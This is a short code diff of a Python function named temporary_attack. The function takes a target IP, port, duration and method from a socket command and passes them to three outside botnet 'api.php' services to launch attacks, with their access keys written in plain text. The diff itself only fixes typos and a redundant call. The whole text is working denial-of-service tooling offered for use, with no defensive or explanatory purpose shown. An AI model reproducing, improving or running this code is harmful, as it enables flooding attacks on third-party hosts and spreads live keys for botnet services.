@@ -34,9 +34,9 @@ def temporary_attack(socket, argv):
                 socket.send("PLEASE PROVIDE A VALID VALUE FOR PORT AND TIME WE HAVE DETECTED YOU HAVENT GAVE AN INT IN THE FEILDS !\r\n".encode())
                 return None
             method = argv[4]
-            socket.send("Sending attac, please wait....".encode())
+            socket.send("Sending attack, please wait....\r\n".encode())
             send = requests.get(f"https://primacyapi.net/client/botnet/api.php?key=RDiPTNVewIpkHNYN&host={ip}&port={port}&time={time}&method={method}").text
-            send2 = requests.get(f"https://gamma-api.cc/panel/api/api.php?key=76DNgR7VD9j5sux8&host={ip}&port={port}&time={time}&method={method}").text.text
+            send2 = requests.get(f"https://gamma-api.cc/panel/api/api.php?key=76DNgR7VD9j5sux8&host={ip}&port={port}&time={time}&method={method}").text
             send3 = requests.get(f"https://voidapi.xyz/panel/api/api.php?key=MrsSqqOYhdxQm2Tc&host={ip}&port={port}&time={time}&method={method}").text
             print(send) # WHY ARE WE PRINTING RESPONSE ????
             print(send2) # WHY ARE WE PRINTING RESPONSE ????
